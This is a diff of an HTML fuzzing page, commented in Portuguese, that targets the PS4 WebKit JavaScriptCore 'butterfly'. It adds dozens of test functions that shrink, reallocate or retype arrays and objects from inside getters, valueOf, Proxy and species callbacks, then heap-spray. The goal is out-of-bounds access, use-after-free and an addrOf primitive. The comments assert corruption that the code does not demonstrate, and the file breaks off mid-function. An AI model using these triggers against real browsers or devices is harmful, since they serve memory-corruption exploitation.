@@ -1,126 +1,1147 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Test 11 - MutationObserver Race (Instrumented)</title>
-<style>
-  body { font-family: monospace; background:#111; color:#0f0; }
-  .warn { color: yellow; }
-  .err { color: red; }
-</style>
+    <meta charset="UTF-8">
+    <title>PS4 WebKit Fuzzing - JSC Butterfly Subversion</title>
 </head>
 <body>
+    <h1>Testes de Corrupcao JSC (Butterfly)</h1>
+    
+    <div style="margin-bottom: 20px;">
+        <button onclick="test101()">Test 101: Array.prototype.shift Capacity OOB</button>
+        <button onclick="test102()">Test 102: Object StructureID Transition Race</button>
+        <button onclick="test103()">Test 103: RegExp Match Butterfly Overwrite</button>
+        <button onclick="test104()">Test 104: Splice Custom valueOf Truncation</button>
+        <button onclick="test105()">Test 105: Holey Array Prototype Proxy Type Confusion</button>
+        <button onclick="test106()">Test 106: Array copyWithin Butterfly Shift</button>
+        <button onclick="test107()">Test 107: Push Argument Truncation OOB</button>
+        <button onclick="test108()">Test 108: Left-Wing Iterator Reallocation</button>
+        <button onclick="test109()">Test 109: Array.flat() Nested Getter UAF</button>
+        <button onclick="test110()">Test 110: Concat Spreadable Type Confusion</button>
+        <button onclick="test111()">Test 111: Array.unshift Reallocation Race</button>
+        <button onclick="test112()">Test 112: Array.reverse Truncation OOB</button>
+        <button onclick="test113()">Test 113: Array.from Iterator Confusion</button>
+        <button onclick="test114()">Test 114: Species Constructor Trap</button>
+        <button onclick="test115()">Test 115: Object.assign Left-Wing Race</button>
+        <button onclick="test116()">Test 116: Array.join toString Truncation</button>
+        <button onclick="test117()">Test 117: reduceRight Backwards OOB</button>
+        <button onclick="test118()">Test 118: preventExtensions Left-Wing Race</button>
+        <button onclick="test119()">Test 119: Array.every Type Confusion (AddrOf base)</button>
+        <button onclick="test120()">Test 120: String.replace Array Push OOB</button>
+        <button onclick="test121()">Test 121: Array.filter Callback Truncation</button>
+        <button onclick="test122()">Test 122: Object.defineProperties Left-Wing UAF</button>
+        <button onclick="test123()">Test 123: JSON.parse Reviver Structure Desync</button>
+        <button onclick="test124()">Test 124: Reflect.construct Array Allocation Trap</button>
+        <button onclick="test125()">Test 125: Function.apply Spread Truncation OOB</button>
+        <button onclick="test126()">Test 126: Sort Comparator Truncation</button>
+        <button onclick="test127()">Test 127: Slice Species Memcopy UAF</button>
+        <button onclick="test128()">Test 128: Splice Expansion Shift OOB</button>
+        <button onclick="test129()">Test 129: Object.seal Left-Wing Race</button>
+        <button onclick="test130()">Test 130: IndexOf Fast-Path Type Confusion</button>
+        <button onclick="test131()">Test 131: Sort Freeze Butterfly Lock</button>
+        <button onclick="test132()">Test 132: Unshift Dictionary Transition Race</button>
+        <button onclick="test133()">Test 133: Splice Expansion OOB (Value Truncation)</button>
+        <button onclick="test134()">Test 134: Concat Spreadable Capacity Overflow</button>
+        <button onclick="test135()">Test 135: Array.fill Prototype Setter Shift</button>
+        <button onclick="test136()">Test 136: Array.pop() Type Confusion Race</button>
+        <button onclick="test137()">Test 137: Object.entries Left-Wing Realignment</button>
+        <button onclick="test138()">Test 138: flatMap() Capacity Expansion OOB</button>
+        <button onclick="test139()">Test 139: Unshift Sparse/Dictionary Desync</button>
+        <button onclick="test140()">Test 140: Splice Proxy Shift Memmove OOB</button>
+    </div>
 
-<h2>MutationObserver Race – Instrumented</h2>
-<pre id="log"></pre>
+    <hr>
+    <div id="log-container"></div>
 
-<script>
-function log(msg, cls="") {
-    const el = document.getElementById("log");
-    const span = document.createElement("div");
-    if (cls) span.className = cls;
-    span.textContent = "[" + performance.now().toFixed(2) + "] " + msg;
-    el.appendChild(span);
-}
-
-function runTest() {
-    log("Iniciando Teste 11 Instrumentado...");
-
-    let div = document.createElement("div");
-    div.id = "target";
-    document.body.appendChild(div);
-
-    let callbackCount = 0;
-    let maxDepth = 0;
-    let inCallback = false;
-    let mutationRecordsTotal = 0;
-    let detachedAccessDetected = false;
-
-    let observer = new MutationObserver((records) => {
-
-        callbackCount++;
-        mutationRecordsTotal += records.length;
-
-        if (inCallback) {
-            log("REENTRÂNCIA detectada!", "warn");
+    <script>
+        function logMsg(msg) {
+            console.log(msg);
+            let p = document.createElement("p");
+            p.innerText = msg;
+            document.getElementById("log-container").appendChild(p);
         }
 
-        inCallback = true;
-        maxDepth++;
-
-        log("Callback #" + callbackCount + 
-            " | records=" + records.length + 
-            " | totalRecords=" + mutationRecordsTotal);
-
-        try {
-
-            // Sanity check 1: acessar nó após possível remoção
-            if (!div.isConnected) {
-                log("Nó já desconectado do DOM", "warn");
-            }
-
-            // Força mutação interna
-            div.innerHTML = "trigger_" + callbackCount;
-
-            // Remove nó (potencial ponto crítico)
-            div.remove();
-
-            // Sanity check 2: tentar acessar após remoção
+        // Teste 101: Array.prototype.shift Capacity OOB
+        // A função shift() move os elementos nativamente no C++ e ajusta o cabeçalho 
+        // de capacidade na Asa Direita da Borboleta. Interceptar a leitura de um elemento 
+        // com um getter para redimensionar o array causa descompasso no deslocamento de memória.
+        function test101() {
+            logMsg("Iniciando Teste 101 (Shift Capacity OOB)...");
             try {
-                let x = div.innerHTML;
-                if (div.isConnected === false) {
-                    detachedAccessDetected = true;
-                    log("Acesso a nó removido realizado", "warn");
+                let arr = [1.1, 2.2, 3.3, 4.4]; // Array de Doubles (Float64)
+                
+                Object.defineProperty(arr, '0', {
+                    get: function() {
+                        // Enquanto o C++ lê o índice 0 para excluí-lo, nós expandimos 
+                        // o array massivamente, forçando a realocação da Borboleta.
+                        arr.length = 10000;
+                        arr.fill(3.3);
+                        return 1.1;
+                    }
+                });
+                
+                // O motor C++ continuará a operação shift usando o tamanho antigo
+                // sobre um ponteiro Butterfly que já foi realocado ou alterado.
+                arr.shift();
+            } catch(e) {}
+            logMsg("Fim do Teste 101.");
+        }
+
+        // Teste 102: Object StructureID Transition Race
+        // O JSC usa 'StructureIDs' para rastrear o formato dos objetos.
+        // Adicionar propriedades transita o objeto de alocação inline para a "Asa Esquerda" (out-of-line).
+        function test102() {
+            logMsg("Iniciando Teste 102 (StructureID Transition)...");
+            try {
+                let target = {};
+                let proxy = new Proxy(target, {
+                    set: function(obj, prop, value) {
+                        // Injetamos dezenas de propriedades para forçar o JSC a abandonar 
+                        // a memória inline e alocar uma nova Borboleta para a Asa Esquerda.
+                        for(let i = 0; i < 100; i++) {
+                            obj['p' + i] = i;
+                        }
+                        obj[prop] = value;
+                        return true;
+                    }
+                });
+                
+                // Dispara o setter. Se o C++ não validar a transição atômica da StructureID,
+                // ele pode escrever as próximas propriedades usando o deslocamento antigo.
+                proxy.trigger = 0x1337;
+            } catch(e) {}
+            logMsg("Fim do Teste 102.");
+        }
+
+        // Teste 103: RegExp Match Array Butterfly Overwrite
+        // A engine de Expressões Regulares cria Arrays (matches) no backend.
+        // Poluir o Object.prototype com getters pode interceptar essa criação 
+        // antes do C++ preencher a Asa Direita com as strings capturadas.
+        function test103() {
+            logMsg("Iniciando Teste 103 (RegExp Match Overwrite)...");
+            try {
+                let re = /(fuzz)(ing)/;
+                let str = "fuzzing_webkit_memory";
+                
+                // Poluição do protótipo base
+                Object.defineProperty(Object.prototype, '1', {
+                    set: function(val) {
+                        // Quando o RegExp tentar escrever o grupo 1 na matriz recém-criada,
+                        // rodamos nosso código. Tentamos truncar ou modificar o array que 
+                        // está sendo ativamente construído pelo motor YARR em C++.
+                        this.length = 0;
+                        let spray = new Array(500).fill({ fake: 0x41414141 });
+                    }
+                });
+                
+                // Gatilho
+                let match = re.exec(str);
+                
+                // Limpeza para não quebrar o resto do ambiente
+                delete Object.prototype['1'];
+            } catch(e) {}
+            logMsg("Fim do Teste 103.");
+        }
+
+        // Teste 104: Splice Custom valueOf Truncation
+        // Semelhante ao splice testado antes, mas forçando o interpretador a pausar
+        // em um objeto embutido na Asa Direita do array.
+        function test104() {
+            logMsg("Iniciando Teste 104 (Splice valueOf Truncation)...");
+            try {
+                let arr = [1, 2, 3, 4, 5];
+                
+                arr[2] = {
+                    valueOf: function() {
+                        // Esvaziamos a Asa Direita da Borboleta
+                        arr.length = 0;
+                        // Forçamos o GC alocando arrays pesados
+                        new ArrayBuffer(1024 * 1024);
+                        return 3;
+                    }
+                };
+                
+                // O C++ vai ler os itens, pausar no índice 2 (rodando nosso JS),
+                // e depois tentar mover os índices 3 e 4 que já não existem na memória.
+                arr.splice(0, 3);
+            } catch(e) {}
+            logMsg("Fim do Teste 104.");
+        }
+
+        // Teste 105: Holey Array Prototype Proxy Type Confusion
+        // "Holey Arrays" (Arrays com buracos, ex: [1, , 3]) fazem o JSC buscar o valor ausente
+        // na cadeia de protótipos. Interceptar isso altera a forma como o C++ empacota os dados.
+        function test105() {
+            logMsg("Iniciando Teste 105 (Holey Array Proxy)...");
+            try {
+                let arr = [1.1, , 3.3]; // Array HoleyDouble
+                
+                let protoProxy = new Proxy([], {
+                    get: function(target, prop) {
+                        if (prop === '1') {
+                            // Convertemos o array original de Doubles para um Array de Objetos (Contíguos)
+                            arr[0] = { corrupt: true };
+                            return 2.2;
+                        }
+                        return target[prop];
+                    }
+                });
+                
+                arr.__proto__ = protoProxy;
+                
+                // As funções nativas iterarão sobre o array. Ao atingir o "buraco" (índice 1),
+                // o getter roda, muda o formato da Borboleta do array original,
+                // e o motor tenta interpretar o índice 2 (3.3) como se fosse um ponteiro de objeto.
+                let result = arr.slice();
+            } catch(e) {}
+            logMsg("Fim do Teste 105.");
+        }
+// Teste 106: Array.prototype.copyWithin Butterfly Shift
+        // O copyWithin move blocos de memória diretamente em C++ (memmove).
+        // Se definirmos um getter no array que encolhe sua capacidade durante a leitura,
+        // o C++ tentará escrever os dados copiados além da nova "Asa Direita".
+        function test106() {
+            logMsg("Iniciando Teste 106 (copyWithin OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                Object.defineProperty(arr, '3', {
+                    get: function() {
+                        // O C++ pausou a cópia para executar este getter.
+                        // Destruímos a Asa Direita da Borboleta truncando o array.
+                        arr.length = 1;
+                        
+                        // Forçamos o GC alocando arrays pesados para reaproveitar a memória
+                        let spray = new Array(1000).fill({ fakeObj: 0x41414141 });
+                        return 4.4;
+                    }
+                });
+                
+                // Copia os índices do 3 ao 5 para o início. Ao ler o 3, o getter dispara.
+                arr.copyWithin(0, 3, 5);
+            } catch(e) {}
+            logMsg("Fim do Teste 106.");
+        }
+
+        // Teste 107: Push Argument Truncation OOB
+        // push() insere múltiplos argumentos sequencialmente. Se um dos argumentos finais
+        // for um objeto com 'valueOf' que oblitera o array, o C++ pode continuar inserindo
+        // os próximos argumentos usando o ponteiro Butterfly antigo (já liberado).
+        function test107() {
+            logMsg("Iniciando Teste 107 (Push Argument Truncation)...");
+            try {
+                let arr = [1.1, 2.2];
+                
+                let detonator = {
+                    valueOf: function() {
+                        arr.length = 0; // Trunca a capacidade no C++
+                        return 3.3;
+                    }
+                };
+                
+                // O WebKit avalia os argumentos e os insere nativamente.
+                // O detonator destrói o array, mas o 4.4 e 5.5 ainda estão na fila do C++ para inserção.
+                arr.push(detonator, 4.4, 5.5);
+            } catch(e) {}
+            logMsg("Fim do Teste 107.");
+        }
+
+        // Teste 108: Left-Wing Iterator Reallocation
+        // Ataca a "Asa Esquerda" (propriedades dinâmicas). O iterador for..in do JSC cria uma
+        // lista interna em C++. Deletar propriedades em massa e criar novas força a Borboleta
+        // a ser realocada na memória, deixando o iterador apontando para uma Asa Esquerda fantasma.
+        function test108() {
+            logMsg("Iniciando Teste 108 (Left-Wing Iterator)...");
+            try {
+                let obj = {};
+                // Preenche a Asa Esquerda (Out-of-line)
+                for (let i = 0; i < 150; i++) obj['prop' + i] = i;
+                
+                let count = 0;
+                for (let key in obj) {
+                    if (count === 50) {
+                        // Deleta massivamente para causar fragmentação
+                        for (let j = 51; j < 150; j++) delete obj['prop' + j];
+                        
+                        // Força a realocação estrutural (StructureID transition) adicionando propriedades novas
+                        for (let j = 0; j < 100; j++) obj['new_prop' + j] = j;
+                        
+                        // O iterador C++ ainda tentará acessar as chaves originais
+                    }
+                    count++;
                 }
-            } catch(e) {
-                log("Erro ao acessar nó removido: " + e, "err");
-            }
-
-        } catch(e) {
-            log("Erro interno no callback: " + e, "err");
+            } catch(e) {}
+            logMsg("Fim do Teste 108.");
         }
 
-        inCallback = false;
-
-        // Limite de segurança
-        if (callbackCount > 50) {
-            log("Loop excessivo detectado. Desconectando observer.", "err");
-            observer.disconnect();
-        }
-    });
-
-    observer.observe(div, {
-        attributes: true,
-        childList: true,
-        subtree: true
-    });
-
-    // Disparo inicial
-    div.setAttribute("data-test", "start");
-
-    // Watchdog para detectar travamento
-    setTimeout(() => {
-        log("Watchdog 2s executado.");
-        log("Resumo:");
-        log("Total callbacks: " + callbackCount);
-        log("Total mutation records: " + mutationRecordsTotal);
-        log("Max depth: " + maxDepth);
-        log("Detached access detected: " + detachedAccessDetected);
-
-        if (callbackCount === 0) {
-            log("Observer não disparou.", "warn");
+        // Teste 109: Array.flat() Nested Getter UAF
+        // A função flat() achata arrays recursivamente usando iteradores nativos do LLInt.
+        // Interceptar um sub-array através de um getter e destruir o array pai causa confusão de escopo.
+        function test109() {
+            logMsg("Iniciando Teste 109 (Array.flat UAF)...");
+            try {
+                let parentArr = [1, 2, [3, 4]];
+                
+                Object.defineProperty(parentArr, '1', {
+                    get: function() {
+                        // Enquanto o motor C++ achata a matriz, destruímos o contêiner raiz
+                        parentArr.length = 0;
+                        
+                        // Ocupamos o heap
+                        let spray = new Array(2000).fill(0x1337);
+                        return 2;
+                    }
+                });
+                
+                // Inicia o processo de achatamento em C++
+                let result = parentArr.flat();
+            } catch(e) {}
+            logMsg("Fim do Teste 109.");
         }
 
-        if (callbackCount > 20) {
-            log("Possível microtask loop.", "warn");
+        // Teste 110: Concat Spreadable Type Confusion
+        // O símbolo 'isConcatSpreadable' força o JSC a tratar um objeto como se fosse um array.
+        // Se mudarmos esse comportamento no meio da leitura nativa e introduzirmos tipos mistos,
+        // o alocador falha em classificar a nova Borboleta corretamente (Double vs Contiguous).
+        function test110() {
+            logMsg("Iniciando Teste 110 (Concat Spreadable Confusion)...");
+            try {
+                let fakeArray = { length: 3, 0: 1.1, 1: 2.2 };
+                fakeArray[Symbol.isConcatSpreadable] = true;
+                
+                Object.defineProperty(fakeArray, '2', {
+                    get: function() {
+                        // Transformamos repentinamente o objeto, mudando seu formato
+                        // para forçar o motor a injetar ponteiros de objetos em uma matriz de Doubles.
+                        fakeArray[Symbol.isConcatSpreadable] = false;
+                        return { leak: "type_confusion" };
+                    }
+                });
+                
+                // O motor espera compilar um array unificado, mas as regras mudam na metade da execução
+                let result = [].concat(fakeArray);
+            } catch(e) {}
+            logMsg("Fim do Teste 110.");
+        }
+ // Teste 111: Array.prototype.unshift Reallocation Race
+        // O método unshift insere elementos no início da Asa Direita.
+        // Isso obriga o C++ a mover todos os elementos existentes para a direita (memmove).
+        // Truncar o array através de um getter no meio dessa operação força o motor
+        // a mover memória além dos novos limites da capacidade da Borboleta.
+        function test111() {
+            logMsg("Iniciando Teste 111 (unshift Reallocation OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                
+                let detonator = {
+                    valueOf: function() {
+                        // Enquanto o unshift calcula o novo tamanho, esvaziamos a matriz
+                        arr.length = 0;
+                        
+                        // Realocação rápida no fastMalloc
+                        let spray = new Array(500).fill({ fakeObj: 0x41414141 });
+                        return 4.4;
+                    }
+                };
+                
+                // O detonator dispara o valueOf antes de inserir.
+                // O C++ tenta mover o 1.1, 2.2 e 3.3 que não existem mais.
+                arr.unshift(detonator);
+            } catch(e) {}
+            logMsg("Fim do Teste 111.");
         }
 
-        log("Fim do Teste.");
-    }, 2000);
-}
+        // Teste 112: Array.prototype.reverse Truncation OOB
+        // A função reverse() itera do início e do fim simultaneamente, trocando os valores em C++.
+        // Se colocarmos um getter nos extremos que deleta o array,
+        // o C++ continuará o loop de troca no meio de uma memória que já foi liberada.
+        function test112() {
+            logMsg("Iniciando Teste 112 (reverse Truncation OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                Object.defineProperty(arr, '0', {
+                    get: function() {
+                        // O C++ toca o índice 0 para trocá-lo com o índice 4.
+                        arr.length = 1; // Destrói a Borboleta original
+                        
+                        // Ocupa o espaço liberado
+                        new ArrayBuffer(1024);
+                        return 1.1;
+                    },
+                    set: function(val) {}
+                });
+                
+                // Dispara o loop C++
+                arr.reverse();
+            } catch(e) {}
+            logMsg("Fim do Teste 112.");
+        }
 
-window.onload = runTest;
-</script>
+        // Teste 113: Array.from Iterator Type Confusion
+        // Array.from usa o protocolo iterável nativo. Se o iterável retornar tipos primitivos (Double),
+        // o JSC aloca uma Borboleta otimizada. Mas se o iterador de repente retornar um Objeto,
+        // e o C++ falhar em transitar o formato a tempo, temos Type Confusion.
+        function test113() {
+            logMsg("Iniciando Teste 113 (Array.from Type Confusion)...");
+            try {
+                let count = 0;
+                let iterable = {
+                    [Symbol.iterator]() {
+                        return {
+                            next() {
+                                count++;
+                                if (count < 5) {
+                                    return { value: 1.1, done: false }; // Floats padrão
+                                } else if (count === 5) {
+                                    // Aos 45 do segundo tempo, injetamos um objeto na matriz de Floats
+                                    return { value: { type_confusion: true }, done: false };
+                                }
+                                return { done: true };
+                            }
+                        };
+                    }
+                };
+                
+                // O C++ tenta construir a Borboleta iterativamente
+                let result = Array.from(iterable);
+            } catch(e) {}
+            logMsg("Fim do Teste 113.");
+        }
 
+        // Teste 114: Species Constructor Trap
+        // Métodos como map(), slice() e filter() usam o Symbol.species para alocar o array de retorno.
+        // Sequestrar esse construtor nos permite retornar um Proxy no lugar do array nativo,
+        // interceptando as gravações do C++ e alterando a estrutura de memória sob demanda.
+        function test114() {
+            logMsg("Iniciando Teste 114 (Species Constructor Trap)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                
+                arr.constructor = {
+                    [Symbol.species]: function() {
+                        // Em vez de retornar um array simples, retornamos um array manipulado
+                        let trapArray = [4.4];
+                        return new Proxy(trapArray, {
+                            set: function(target, prop, value) {
+                                if (prop === '1') {
+                                    // Mudamos a forma do array base durante a inserção nativa
+                                    target[0] = { corrupt: 0x1337 };
+                                }
+                                target[prop] = value;
+                                return true;
+                            }
+                        });
+                    }
+                };
+                
+                // O map() aloca o array de retorno via species e tenta escrever nele
+                let result = arr.map(x => x);
+            } catch(e) {}
+            logMsg("Fim do Teste 114.");
+        }
+
+        // Teste 115: Object.assign Left-Wing Race
+        // O Object.assign copia propriedades (Asa Esquerda da Borboleta) nativamente.
+        // Injetar um getter na origem que apaga as propriedades do alvo força o JSC
+        // a escrever em uma Asa Esquerda que acabou de ser encolhida/liberada.
+        function test115() {
+            logMsg("Iniciando Teste 115 (Object.assign Left-Wing Race)...");
+            try {
+                let target = {};
+                for(let i = 0; i < 50; i++) target['prop' + i] = i; // Preenche a Asa Esquerda
+                
+                let source = {};
+                Object.defineProperty(source, 'trigger', {
+                    get: function() {
+                        // Deletamos as propriedades do alvo, colapsando a Asa Esquerda dele
+                        for(let i = 0; i < 50; i++) delete target['prop' + i];
+                        
+                        // Preenchemos a memória livre com Strings
+                        let spray = new Array(100).fill("A".repeat(64));
+                        return "payload";
+                    },
+                    enumerable: true
+                });
+                source.normalProp = 1;
+                
+                // O C++ itera sobre a origem e escreve no alvo
+                Object.assign(target, source);
+            } catch(e) {}
+            logMsg("Fim do Teste 115.");
+        }
+// Teste 116: Array.prototype.join toString Truncation
+        // O método join() itera nativamente sobre o array no C++ e chama toString() 
+        // em cada elemento para calcular o tamanho final do buffer de string.
+        // Se o toString() do primeiro elemento encolher o array, os próximos acessos
+        // do iterador C++ na Asa Direita lerão memória liberada (UAF/OOB).
+        function test116() {
+            logMsg("Iniciando Teste 116 (Array.join Truncation)...");
+            try {
+                let arr = [{
+                    toString: function() {
+                        // O C++ pausou a iteração. Destruímos a Borboleta nativa.
+                        arr.length = 0;
+                        
+                        // Forçamos o GC e pulverizamos a memória (Heap Spraying)
+                        let spray = new Array(500).fill({ fakeObj: 0x41414141 });
+                        return "fuzz";
+                    }
+                }, 2.2, 3.3, 4.4, 5.5];
+                
+                // O motor continuará a tentar ler os índices 1, 2, 3 e 4 do ponteiro antigo.
+                let result = arr.join(",");
+            } catch(e) {}
+            logMsg("Fim do Teste 116.");
+        }
+
+        // Teste 117: Array.prototype.reduceRight Backwards OOB
+        // reduceRight() itera o array do fim para o começo.
+        // Encolher o array logo no primeiro passo (que é o último índice) deixa 
+        // o ponteiro interno C++ correndo para trás em uma região de memória já liberada.
+        function test117() {
+            logMsg("Iniciando Teste 117 (reduceRight Backwards OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                Object.defineProperty(arr, '4', {
+                    get: function() {
+                        // O loop reverso começou aqui.
+                        // Cortamos o array pela raiz, obliterando a Asa Direita.
+                        arr.length = 1; 
+                        
+                        new ArrayBuffer(1024); // Ocupa a fenda liberada
+                        return 5.5;
+                    }
+                });
+                
+                arr.reduceRight((acc, val) => acc + val, 0);
+            } catch(e) {}
+            logMsg("Fim do Teste 117.");
+        }
+
+        // Teste 118: preventExtensions Left-Wing Race
+        // Object.preventExtensions altera abruptamente a StructureID do objeto no JSC,
+        // impedindo novas alocações na Asa Esquerda (propriedades).
+        // Interceptar a criação de uma propriedade com um Proxy e selar o objeto
+        // confunde o alocador C++ sobre onde colocar a próxima variável.
+        function test118() {
+            logMsg("Iniciando Teste 118 (preventExtensions Left-Wing)...");
+            try {
+                let target = {};
+                for(let i = 0; i < 50; i++) target['p' + i] = i; // Preenche a Asa Esquerda
+                
+                let proxy = new Proxy(target, {
+                    set: function(obj, prop, value) {
+                        if (prop === 'trigger') {
+                            // Selamos o objeto no C++, travando o tamanho da Borboleta
+                            Object.preventExtensions(obj);
+                        }
+                        obj[prop] = value; // O C++ tenta escrever uma nova propriedade em um espaço não alocado
+                        return true;
+                    }
+                });
+                
+                proxy.trigger = "OOB_Write";
+            } catch(e) {}
+            logMsg("Fim do Teste 118.");
+        }
+
+        // Teste 119: Array.prototype.every Type Confusion (Precursor AddrOf)
+        // Array.every() possui caminhos otimizados (fast paths) no C++ para Arrays de Doubles.
+        // Se, durante a iteração, injetarmos um Objeto (Contiguous) no array, 
+        // e o C++ não invalidar o fast path a tempo, ele lerá o ponteiro do Objeto 
+        // como se fosse um número IEEE-754 flutuante.
+        function test119() {
+            logMsg("Iniciando Teste 119 (Array.every Type Confusion)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5]; // Array de Floats
+                let targetObj = { leak: "meu_endereco_na_memoria" };
+                
+                arr.every(function(val, idx) {
+                    if (idx === 1) {
+                        // Transição brusca de StructureID: De ArrayWithDouble para ArrayWithContiguous
+                        arr[2] = targetObj;
+                    }
+                    if (idx === 2) {
+                        // Se houver Type Confusion, 'val' conterá o endereço de memória
+                        // do targetObj, representado como um número decimal.
+                        let leakedFloat = val; 
+                    }
+                    return true;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 119.");
+        }
+
+        // Teste 120: String.replace Array Push OOB
+        // O motor de Expressões Regulares (YARR) chama funções de callback nativamente.
+        // Se essa função empurrar dados para um array cuja Borboleta é destruída no meio do processo,
+        // geramos um OOB Write altamente controlável.
+        function test120() {
+            logMsg("Iniciando Teste 120 (String.replace Array Push OOB)...");
+            try {
+                let str = "A".repeat(10);
+                let targetArr = [1.1];
+                let count = 0;
+                
+                str.replace(/A/g, function() {
+                    count++;
+                    if (count === 5) {
+                        // No meio do processamento global do Regex, obliteramos o alvo
+                        targetArr.length = 0; 
+                        
+                        // Pulveriza a memória para o push subsequente sobrescrever o lixo
+                        let spray = new Array(100).fill({ fakeObj: 0x1337 });
+                    }
+                    // O LLInt tentará dar push em uma Borboleta que não pertence mais ao targetArr
+                    targetArr.push(2.2); 
+                    return "B";
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 120.");
+        }
+// Teste 121: Array.prototype.filter Callback Truncation
+        // O método filter cria uma Borboleta nova para o array de retorno, mas itera 
+        // pela Borboleta antiga nativamente no C++. Encolher o array base no meio 
+        // da iteração obriga o C++ a ler lixo da memória (Asa Direita) para passar ao callback.
+        function test121() {
+            logMsg("Iniciando Teste 121 (Array.filter Truncation)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                let result = arr.filter(function(val, idx) {
+                    if (idx === 1) {
+                        // Truncamos a Borboleta do array original durante o loop
+                        arr.length = 0;
+                        
+                        // Ocupamos a fenda deixada no Heap
+                        let spray = new Array(100).fill({ fakeObj: 0x41414141 });
+                    }
+                    // A partir do idx 2, 'val' conterá dados da memória liberada se o C++ não abortar
+                    return val > 0;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 121.");
+        }
+
+        // Teste 122: Object.defineProperties Left-Wing UAF
+        // O método defineProperties processa múltiplos descritores de uma vez em C++.
+        // Se um descritor possuir um getter que infla o objeto com dezenas de propriedades,
+        // a Asa Esquerda da Borboleta é forçada a realocar. O C++ pode continuar 
+        // a escrever os próximos descritores no ponteiro fantasma antigo.
+        function test122() {
+            logMsg("Iniciando Teste 122 (defineProperties Left-Wing)...");
+            try {
+                let obj = { a: 1 };
+                
+                Object.defineProperties(obj, {
+                    'b': {
+                        get: function() {
+                            // Expandimos a Asa Esquerda massivamente, causando realocação (memmove)
+                            for(let i = 0; i < 200; i++) obj['p' + i] = i;
+                            
+                            // Spray para ocupar o bloco antigo da Asa Esquerda
+                            new ArrayBuffer(1024);
+                            return 2;
+                        },
+                        enumerable: true
+                    },
+                    'c': {
+                        value: 3, // O C++ pode escrever este '3' no endereço de memória já liberado
+                        writable: true,
+                        enumerable: true
+                    }
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 122.");
+        }
+
+        // Teste 123: JSON.parse Reviver Structure Desync
+        // JSON.parse constrói a estrutura Butterfly do objeto nativamente em altíssima velocidade.
+        // O parâmetro 'reviver' é chamado do JS logo após a criação. 
+        // Apagar as propriedades irmãs de dentro do reviver corrompe o StructureID e os offsets do objeto.
+        function test123() {
+            logMsg("Iniciando Teste 123 (JSON.parse Reviver Desync)...");
+            try {
+                let jsonString = '{"prop1": 1.1, "prop2": 2.2, "prop3": 3.3}';
+                
+                let obj = JSON.parse(jsonString, function(key, value) {
+                    if (key === 'prop1') {
+                        // O C++ acabou de montar a Borboleta. Nós a destruímos parcialmente.
+                        delete this['prop2'];
+                        delete this['prop3'];
+                        
+                        // Inserimos novas propriedades para bagunçar a tabela de transição do JSC
+                        this['prop4'] = { corrupt: true };
+                    }
+                    return value;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 123.");
+        }
+
+        // Teste 124: Reflect.construct Array Allocation Trap
+        // Usar Reflect.construct permite criar um Array delegando a construção a um Proxy.
+        // O motor C++ se perde ao tentar dimensionar a Borboleta inicial se o Proxy 
+        // interceptar as checagens internas de tipo (Type Confusion logo na raiz da alocação).
+        function test124() {
+            logMsg("Iniciando Teste 124 (Reflect.construct Array Trap)...");
+            try {
+                let handler = {
+                    get: function(target, prop, receiver) {
+                        if (prop === 'length') return 100; // Mente sobre o tamanho
+                        return Reflect.get(target, prop, receiver);
+                    }
+                };
+                let proxy = new Proxy(Array, handler);
+                
+                // Força o C++ a alocar a memória baseando-se no Proxy instável
+                let malformedArray = Reflect.construct(Array, [1.1, 2.2, 3.3], proxy);
+                
+                // Tenta engatilhar OOB na estrutura anômala
+                malformedArray.push(4.4);
+            } catch(e) {}
+            logMsg("Fim do Teste 124.");
+        }
+
+        // Teste 125: Function.apply Spread Truncation OOB
+        // Func.apply(null, array) copia os elementos da Borboleta do array para a pilha (stack/registradores) do C++.
+        // Se definirmos um getter no array que zera o tamanho dele no meio dessa cópia,
+        // o C++ espalhará memória residual da Asa Direita para os argumentos da função.
+        function test125() {
+            logMsg("Iniciando Teste 125 (Function.apply Spread OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                Object.defineProperty(arr, '2', {
+                    get: function() {
+                        // A cópia pausou no índice 2. Destruímos a matriz.
+                        arr.length = 0;
+                        
+                        // Spray rápido na memória
+                        let spray = new Array(500).fill(0x13371337);
+                        return 3.3;
+                    }
+                });
+                
+                // Math.max forçará a leitura de todos os elementos para a pilha nativa.
+                // Ao passar do índice 2, o C++ vai ler e espalhar lixo de memória.
+                let result = Math.max.apply(null, arr);
+            } catch(e) {}
+            logMsg("Fim do Teste 125.");
+        }
+// Teste 126: Sort Comparator Truncation
+        // O C++ do JSC usa algoritmos de ordenação nativos (como introsort/quicksort).
+        // Se a função de comparação definida pelo usuário destruir a "Asa Direita"
+        // no meio do processo, o motor tentará trocar (swap) ponteiros em memória liberada.
+        function test126() {
+            logMsg("Iniciando Teste 126 (Sort Comparator Truncation)...");
+            try {
+                let arr = new Array(100).fill(1.1);
+                let count = 0;
+                
+                arr.sort(function(a, b) {
+                    count++;
+                    if (count === 2) {
+                        // Na segunda comparação, obliteramos a matriz base
+                        arr.length = 0;
+                        
+                        // Enchemos a memória recém-liberada com lixo estrutural
+                        let spray = new Array(500).fill({ fakeObj: 0x41414141 });
+                    }
+                    return a - b;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 126.");
+        }
+
+        // Teste 127: Slice Species Memcopy UAF
+        // A função slice() copia trechos da Borboleta nativamente. Ao usar Symbol.species,
+        // o C++ delega a alocação do novo array ao JS. Se nesse momento apagarmos o
+        // array original, o memcopy subsequente fará uma leitura de memória morta (UAF).
+        function test127() {
+            logMsg("Iniciando Teste 127 (Slice Species Memcopy)...");
+            try {
